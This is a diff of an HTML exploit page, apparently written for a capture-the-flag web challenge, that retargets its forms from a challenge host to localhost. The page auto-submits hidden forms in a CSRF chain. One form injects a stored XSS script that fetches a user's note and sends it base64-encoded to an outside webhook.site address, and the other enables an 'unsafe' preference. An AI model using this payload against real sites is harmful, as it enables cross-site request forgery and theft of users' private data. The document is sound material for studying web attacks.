@@ -1,9 +1,9 @@
 <!doctype html>
-<form id=n action="http://simplechallenge.ctf.onl:7189/dashboard" method="post" style="display:none">
+<form id=n action="http://127.0.0.1:7189/dashboard" method="post" style="display:none">
     <input type=hidden name=content value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://webhook.site/863deed3-dfc1-4124-93dc-34453981eccb?d="+encodeURIComponent(btoa(t))})</script>'>
   </form>
 
-<form id=u action="http://simplechallenge.ctf.onl:7189/prefs/unsafe" method="post" style="display:none">
+<form id=u action="http://127.0.0.1:7189/prefs/unsafe" method="post" style="display:none">
   <input type=hidden name=id value=2>
   <input type=hidden name=enable value=1>
 </form>
@@ -13,4 +13,4 @@ const w=window.open('about:blank','noteWin');
 n.target=u.target='noteWin';
 n.submit();
 setTimeout(()=>u.submit(),400);
-</script>                                                          
+</script>
